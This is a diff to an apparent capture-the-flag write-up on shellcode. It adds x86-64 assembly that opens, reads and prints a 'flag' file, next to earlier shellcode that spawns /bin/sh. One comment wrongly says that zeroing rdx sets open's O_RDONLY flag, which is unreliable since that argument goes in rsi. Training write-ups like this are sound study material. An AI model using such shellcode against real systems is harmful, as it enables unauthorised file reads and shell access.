@@ -28,3 +28,25 @@ push rdi                       ; pushes /bin/sh onto the stack.
 mov rdi, rsp                   ; points rdi to the location of /bin/sh on the stack.
 ```
 - To push it correctly onto the stack, the bytes of "/bin/sh" must be reversed since the system uses little-endian byte ordering.
+
+## Another alterantive solution
+Another approach is to makes use of three system calls: open(), read(), and write().
+```{asm}
+mov rdx, 0x0067616c66      ; reverse the string "flag" and move it into rdx
+mov rax, 2                 ; syscall number for open() (2)
+push rdx                   ; push "flag" onto the stack
+mov rdi, rsp               ; move the pointer to "flag" (on the stack) into rdi
+xor rdx, rdx               ; set rdx to 0 (O_RDONLY flag for open)
+syscall                    ; call open("flag", O_RDONLY)
+
+mov rdi, rax               ; move the file descriptor returned by open into rdi
+xor eax, eax               ; set eax to 0 (syscall number for read)
+mov rdx, 70                ; set rdx to 70 (the number of bytes to read)
+mov rsi, rsp               ; move the stack pointer to rsi (buffer to store the read data)
+syscall                    ; call read(file descriptor, buffer, 70)
+
+mov rax, 1                 ; syscall number for write() (1)
+mov rdi, 1                 ; file descriptor 1 (stdout)
+syscall                    ; call write(stdout, buffer, 70)
+```
+For a more detailed explanation refer to the challenge [open_read_write](../open_read_write/)
